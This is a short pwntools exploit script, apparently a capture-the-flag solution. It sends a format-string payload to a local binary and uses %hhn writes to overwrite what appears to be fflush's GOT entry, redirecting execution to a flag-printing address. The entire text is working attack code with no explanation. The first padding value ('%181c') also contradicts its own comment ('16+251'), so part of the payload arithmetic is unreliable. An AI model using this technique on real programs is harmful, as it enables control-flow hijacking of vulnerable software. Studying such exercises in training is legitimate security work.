from pwn import *
context.log_level = "debug"
p = process("./32_new")

# gdb.attach(p)
print(p.recvline())
# raw_input()
#flag 0x0804870b

fflush_addr1 = 0x0804a028
fflush_addr2 = 0x0804a029
fflush_addr3 = 0x0804a02a
fflush_addr4 = 0x0804a02b

padding1 = "%181c"  # 16+251=267->0x10b
padding2 = "%124c"  # 267+124=391->0x187
padding3 = "%125c"  # 391+125=516->0x204
padding4 = "%4c"    # 516+4=520 -> 0x208


fmt_string1 = "%10$hhn"
fmt_string2 = "%11$hhn"
fmt_string3 = "%12$hhn"
fmt_string4 = "%13$hhn"

payload = p32(fflush_addr1)
payload += p32(fflush_addr2)
payload += p32(fflush_addr3)
payload += p32(fflush_addr4)
payload += padding1
payload += fmt_string1
payload += padding2
payload += fmt_string2
payload += padding3
payload += fmt_string3
payload += padding4
payload += fmt_string4

p.sendline(payload)
p.recvall()
